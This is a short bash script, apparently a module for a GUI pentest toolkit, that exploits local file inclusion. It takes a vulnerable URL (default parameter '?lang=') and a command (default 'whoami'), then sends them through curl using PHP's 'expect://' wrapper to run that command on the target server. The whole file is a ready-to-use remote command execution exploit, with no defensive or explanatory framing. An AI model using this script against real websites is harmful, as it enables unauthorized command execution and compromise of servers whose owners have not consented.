#!/bin/bash

: '
lfi: execute commands with expect://
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "CMD" "cmd" "whoami")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}

execute_command "curl -ks '${WEBSITE}expect://${CMD}'"
create_new_line
